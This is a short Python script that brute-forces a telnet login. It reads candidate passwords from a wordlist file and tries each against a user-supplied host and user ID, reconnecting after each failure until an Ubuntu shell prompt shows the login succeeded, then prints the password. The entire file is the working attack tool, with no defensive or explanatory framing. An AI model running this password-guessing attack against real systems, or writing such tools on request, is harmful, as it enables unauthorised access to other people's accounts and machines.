import telnetlib
 
# init
f = None
t = None
count = 1
line = None
 
# func
def f_open():
    global f
       
    answer = input("dictionary path: ")
    print(answer)
    f = open("/root/Downloads/%s.txt" % answer, 'r' )
 
def t_open():
   # telnet connet
    global t
 
    t = telnetlib.Telnet()
    t.open(host)
 
def i_print():
    global f, line
   # Proceeding
    line = f.readline()
    print ("[" + str (count) + "]ID : %s / Password : %s" % (ID, line))
 
def try_login():
    global t, line, ID
    # try login
    t.read_until(b"login: ")
    t.write(ID.encode('ascii') + b"\r\n")
    t.read_until(b"Password: ")
    t.write(line.encode('ascii') + b"\r\n")
 
 
host = input("input host: ")
ID = input("input ID : ")
f_open()
t_open()
 
 
while True:
   
    i_print()
    try_login()
 
   # compare
    compare = t.read_until(b"@ubuntu:~$", 1)
    compare = compare[-10:]
    count += 1
    if compare == b"@ubuntu:~$":
        print("login succed")
        print("ID: %s / Password: %s " % (ID, line))
        break
 
    else:
        print("Trying to re-connect to the host...")
        t_open()
       
 
t.close()
f.close()
